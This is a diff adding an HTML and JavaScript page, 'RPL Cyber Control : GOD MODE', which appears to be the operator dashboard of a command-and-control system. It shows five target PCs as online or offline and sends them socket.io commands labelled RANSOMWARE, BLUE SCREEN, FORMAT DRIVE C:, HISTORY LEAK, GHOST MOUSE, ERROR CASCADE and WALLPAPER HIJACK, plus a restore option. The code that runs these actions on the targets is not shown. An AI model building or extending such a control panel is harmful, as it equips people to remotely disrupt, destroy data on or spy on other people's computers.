@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RPL Cyber Control</title>
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    background: #050505;
+    color: #00ff66;
+    font-family: Consolas, monospace;
+}
+
+header {
+    padding: 24px;
+    border-bottom: 1px solid #123;
+}
+
+h1 {
+    margin: 0;
+    font-size: 28px;
+}
+
+main {
+    max-width: 1000px;
+    margin: auto;
+    padding: 24px;
+}
+
+.status {
+    padding: 16px;
+    margin-bottom: 20px;
+    background: #090909;
+    border: 1px solid #123;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+select {
+    padding: 8px;
+    background: #020202;
+    color: #00ff66;
+    border: 1px solid #00ff66;
+    font-family: Consolas, monospace;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+.clients {
+    display: grid;
+    grid-template-columns: repeat(auto-fit,minmax(170px,1fr));
+    gap: 12px;
+    margin-bottom: 25px;
+}
+
+.client {
+    padding: 20px;
+    background: #090909;
+    border: 1px solid #123;
+}
+
+.online {
+    margin-top: 8px;
+}
+
+.controls {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+}
+
+button {
+    padding: 16px;
+    background: #080808;
+    color: #00ff66;
+    border: 1px solid #00ff66;
+    font-family: inherit;
+    font-size: 15px;
+    cursor: pointer;
+    font-weight: bold;
+}
+
+button:hover {
+    background: #00ff66;
+    color: #000;
+}
+
+.restore {
+    color: #ff4444;
+    border-color: #ff4444;
+    grid-column: 1 / -1;
+    margin-top: 15px;
+}
+
+.restore:hover {
+    background: #ff4444;
+    color: #000;
+}
+
+#log {
+    margin-top: 25px;
+    padding: 15px;
+    height: 180px;
+    overflow-y: auto;
+    background: #020202;
+    border: 1px solid #123;
+    font-size: 13px;
+}
+</style>
+</head>
+<body>
+
+<header>
+    <h1>RPL CYBER CONTROL : GOD MODE</h1>
+</header>
+
+<main>
+
+<div class="status">
+    <div>
+        STATUS: <span id="status">CONNECTING...</span>
+    </div>
+    <div>
+        TARGET: 
+        <select id="targetSelect">
+            <option value="ALL">ALL PCs</option>
+            <option value="PC01">PC01</option>
+            <option value="PC02">PC02</option>
+            <option value="PC03">PC03</option>
+            <option value="PC04">PC04</option>
+            <option value="PC05">PC05</option>
+        </select>
+    </div>
+</div>
+
+<div class="clients" id="clients"></div>
+
+<div class="controls">
+    <button onclick="sendCommand('RANSOMWARE')">RANSOMWARE</button>
+    <button onclick="sendCommand('BSOD')">BLUE SCREEN</button>
+    <button onclick="sendCommand('GHOST_MOUSE')">GHOST MOUSE</button>
+    <button onclick="sendCommand('FORMAT_C')">FORMAT DRIVE C:</button>
+    <button onclick="sendCommand('DATA_LEAK')">HISTORY LEAK</button>
+    <button onclick="sendCommand('POPUP_SPAM')">ERROR CASCADE</button>
+    <button onclick="sendCommand('WALLPAPER')">WALLPAPER HIJACK</button>
+
+    <button class="restore" onclick="sendCommand('RESTORE')">RESTORE ALL TARGETS</button>
+</div>
+
+<div id="log"></div>
+
+</main>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io();
+
+const status = document.getElementById("status");
+const clients = document.getElementById("clients");
+const logBox = document.getElementById("log");
+const targetSelect = document.getElementById("targetSelect");
+
+function log(message) {
+    const line = document.createElement("div");
+    line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+    logBox.prepend(line);
+}
+
+socket.on("connect", () => {
+    status.textContent = "CONNECTED";
+    socket.emit("controller-auth");
+    log("Control Hub connected");
+});
+
+socket.on("controller-authenticated", data => {
+    status.textContent = "CONTROL READY";
+    renderClients(data.clients);
+});
+
+socket.on("client-list", list => {
+    renderClients(list);
+});
+
+function renderClients(list) {
+    clients.innerHTML = "";
+    for (let i = 1; i <= 5; i++) {
+        const id = `PC${String(i).padStart(2,"0")}`;
+        const online = list.includes(id);
+        const element = document.createElement("div");
+        element.className = "client";
+        element.innerHTML = `
+            <strong>${id}</strong>
+            <div class="online">
+                ${online ? "🟢 ONLINE" : "⚫ OFFLINE"}
+            </div>
+        `;
+        clients.appendChild(element);
+    }
+}
+
+function sendCommand(command, payload = null) {
+    const target = targetSelect.value;
+    socket.emit("command", { target, command, payload });
+    log(`Command sent: ${command} to ${target}`);
+}
+</script>
+
+</body>
+</html>
